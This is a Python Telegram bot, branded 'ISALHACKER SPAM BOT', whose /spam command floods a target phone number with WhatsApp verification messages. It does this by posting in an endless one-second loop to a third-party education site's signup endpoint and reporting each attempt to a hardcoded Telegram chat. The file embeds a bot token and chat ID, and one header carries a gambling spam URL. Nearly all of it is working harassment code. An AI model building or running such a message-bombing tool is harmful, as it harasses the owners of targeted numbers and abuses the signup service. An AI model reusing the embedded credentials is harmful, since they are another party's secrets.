import requests
import time
import threading
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import asyncio



g = "\033[1;32m"
r = "\033[1;31m"
e = "\033[0m"



TELEGRAM_BOT_TOKEN = "8251704618:AAFYaaquKz6ATcRJLGNdnqXcYzF46beJ8Bc"
TELEGRAM_CHAT_ID = "7637629406"


#KODE SPAM

def SMARK(phone_number):
    u = "https://gw.abgateway.com/student/whatsapp/signup"
    h = {
        "Host": "gw.abgateway.com",
        "sec-ch-ua-platform": '"Linux"',
        "sec-ch-ua": '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
        "sec-ch-ua-mobile": "?0",
        "x-trace-id": "guest_user:5743fd73-9490-4b19-90f5-bb3391ddbd51",
        "access-control-allow-origin": "*",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Platform": "web",
        "Origin": "https://www.abwaabiraq.com",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://极速飞艇开奖官网【987kj.com】邀请码233388/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "ar,en-US;q=0.9,en;q=0.8,ja;q=0.7",
        "Priority": "u=1"
    }
    d = {
        "language": "ar",
        "password": "Ab9rT6xQ",
        "country": "",
        "phone": phone_number,
        "platform": "web",
        "data": {"Language": "ar"},
        "channel": "whatsapp"
    }
    
    n = 0
    while True:
        try:
            rqs = requests.post(u, headers=h, json=d)
            n += 1
            status_msg = f"Spam attempt {n} | Status: {rqs.status_code}"
            
            # KIRIM STATUS KE TELEGRAM (ASYNC VERSION)
            asyncio.run(send_telegram_message_async(status_msg))
            
            try:
                j = rqs.json()
                print(f"{g}{status_msg} | Response JSON: {j}{e}")
            except:
                print(f"{g}{status_msg} | Response Text: {rqs.text}{e}")
            time.sleep(1)
        except Exception as err:
            error_msg = f"Error: {err}"
            asyncio.run(send_telegram_message_async(error_msg))
            print(f"{r}{error_msg}{e}")
            time.sleep(1)


#TELEGRAM FUNCTIONS (ASYNC)

async def send_telegram_message_async(message):
    try:
        app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        await app.bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)
    except Exception as e:
        print(f"{r}Telegram Error: {e}{e}")


#TELEGRAM COMMAND HANDLERS

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("ISALHACKER SPAM BOT AKTIF! Gunakan /spam [nomor] untuk memulai!")

async def spam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        phone_number = context.args[0]
        await update.message.reply_text(f"SPAM DIMULAI UNTUK NOMOR: {phone_number}")
        
        # JALANKAN SPAM DI THREAD TERPISAH
        threading.Thread(target=SMARK, args=(phone_number,), daemon=True).start()
    else:
        await update.message.reply_text("Format: /spam [nomor_telepon]")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("""
ISALHACKER SPAM BOT COMMANDS:
/start - Memulai bot
/spam [nomor] - Memulai spam ke nomor target
/help - Menampilkan bantuan
""")


#MAIN TELEGRAM BOT

def main():
    # BUILD APPLICATION WITH MODERN TELEGRAM BOT V20+
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # ADD COMMAND HANDLERS
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("spam", spam_command))
    application.add_handler(CommandHandler("help", help_command))
    
    print(f"{g}Telegram Bot Started!{e}")
    application.run_polling()

if __name__ == "__main__":
    # JALANKAN BOT TELEGRAM
    main()
